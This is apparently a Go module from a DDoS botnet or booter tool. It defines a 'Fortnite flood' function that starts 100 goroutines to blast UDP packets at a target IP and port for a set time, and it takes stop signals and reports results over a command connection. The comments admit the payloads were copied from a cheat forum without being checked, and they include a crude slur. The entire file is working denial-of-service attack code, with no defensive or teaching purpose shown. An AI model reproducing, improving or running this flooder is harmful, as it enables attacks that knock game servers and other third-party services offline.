package udp

import (
	"fmt"
	"math/rand"
	"net"
	"sync"
	"time"

	"go_net/pkg/core"
)

// TS MIGHT WORK OR NOT
func StartFortniteFlood(targetIP string, port int, durationSecs int, conn net.Conn) {
	targetAddr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", targetIP, port))
	if err != nil {
		core.SendResponse(conn, fmt.Sprintf("ERROR: %v", err))
		return
	}

	endTime := time.Now().Add(time.Duration(durationSecs) * time.Second)

	var wg sync.WaitGroup
	numWorkers := 100

	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()

			udpConn, err := net.ListenPacket("udp", ":0")
			if err != nil {
				return
			}
			defer udpConn.Close()

			r := rand.New(rand.NewSource(time.Now().UnixNano() + int64(workerID)))
			// i have no idea if ts works i used unknowncheats.me
			payloads := [][]byte{
				{0x01, 0x00, 0x00, 0x00, 0x00},
				{0x09, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00},
				make([]byte, 64), // act ts should use 0x08 but who cares!
			}
			for i := range payloads[2] {
				payloads[2][i] = byte(r.Intn(256))
			}

			for time.Now().Before(endTime) {
				if core.GetAttackStop() {
					return
				}

				for j := 0; j < 100; j++ {
					pIdx := j % len(payloads)
					_, _ = udpConn.WriteTo(payloads[pIdx], targetAddr)
				}
				time.Sleep(1 * time.Microsecond) // this is called cpu rape
			}
		}(i)
	}

	wg.Wait()
	core.SendResponse(conn, fmt.Sprintf("Done.", targetAddr))
}
